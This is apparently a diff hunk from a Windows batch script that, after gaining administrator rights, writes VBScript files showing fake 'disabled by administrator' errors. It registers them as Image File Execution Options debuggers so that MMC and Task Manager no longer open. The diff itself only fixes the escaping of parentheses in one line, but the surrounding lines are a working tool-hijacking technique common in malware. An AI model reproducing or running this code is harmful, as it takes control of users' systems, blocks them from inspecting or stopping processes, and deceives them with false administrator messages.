@@ -19,7 +19,7 @@ if '%errorlevel%' NEQ '0' (
     exit /B
 
 :gotAdmin
-echo x=msgbox("The MMC has been disabled by administrator.", VBOkOnly+VbCritical, "Error") > C:\Windows\error_mmc.vbs
+echo x=msgbox^("The MMC has been disabled by administrator.", VBOkOnly+VbCritical, "Error"^) > C:\Windows\error_mmc.vbs
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mmc.exe" /v Debugger /d C:\Windows\error_mmc.vbs /t REG_SZ /f > nul
 echo x=msgbox^("The task manager been disabled by administrator.", VBOkOnly+VbCritical, "Error"^) > C:\Windows\error_taskmgr.vbs
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /v Debugger /d C:\Windows\error_taskmgr.vbs /t REG_SZ /f > nul
